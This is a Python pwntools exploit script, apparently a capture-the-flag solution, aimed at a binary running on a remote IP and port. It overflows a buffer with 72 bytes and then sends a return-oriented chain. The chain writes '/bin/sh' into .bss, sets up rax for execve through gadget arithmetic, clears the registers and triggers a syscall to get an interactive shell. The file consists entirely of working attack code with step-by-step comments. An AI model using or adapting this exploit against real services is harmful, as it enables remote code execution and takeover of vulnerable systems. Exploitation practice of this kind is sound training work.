from pwn import *

#p = process('./vuln')
p = remote('103.152.242.116', 20371)
load = b'a'*72

# step 1 # write to bss a.k.a 0000000000404030
# 0x0000000000401126 : mov qword ptr [rdi], rsi ; nop ; pop rbp ; ret
# 0x00000000004011fb : pop rdi ; ret
# 0x00000000004011f9 : pop rsi ; pop r15 ; ret

load += p64(0x00000000004011fb)
load += p64(0x0000000000404030)

load += p64(0x00000000004011f9)
load += b'/bin/sh\x00'
load += b'B'*8 # r15

load += p64(0x0000000000401126)
load += b'C'*8 # rbp

# step 2 setup rax to 0x3b
# 0x000000000040114d : mov rax, 0x40 ; nop ; pop rbp ; ret
# 0x000000000040115b : sub rax, 6 ; nop ; pop rbp ; ret
# 0x0000000000401166 : add rax, 1 ; nop ; pop rbp ; ret

# rax at 0x40
load += p64(0x000000000040114d)
load += b'C'*8

# decrease rax to 0x3a
load += p64(0x000000000040115b)
load += b'C'*8

# rax is now 3b
load += p64(0x0000000000401166)
load += b'C'*8

# step 3 call it
# 0x0000000000401171 : xor rcx, rcx ; nop ; pop rbp ; ret
# 0x0000000000401139 : xor rdx, rdx ; nop ; pop rbp ; ret
# 0x00000000004011fb : pop rdi ; ret
# 0x00000000004011f9 : pop rsi ; pop r15 ; ret
# 0x0000000000401130 : syscall

load += p64(0x0000000000401171) # rcx
load += b'C'*8

load += p64(0x0000000000401139) #rdx
load += b'C'*8

load += p64(0x00000000004011f9) # rsi
load += p64(0)
load += p64(0)

load += p64(0x00000000004011fb) #rdi
load += p64(0x0000000000404030)

load += p64(0x0000000000401130) # syscall
#pause()
p.sendline(load)
p.interactive()
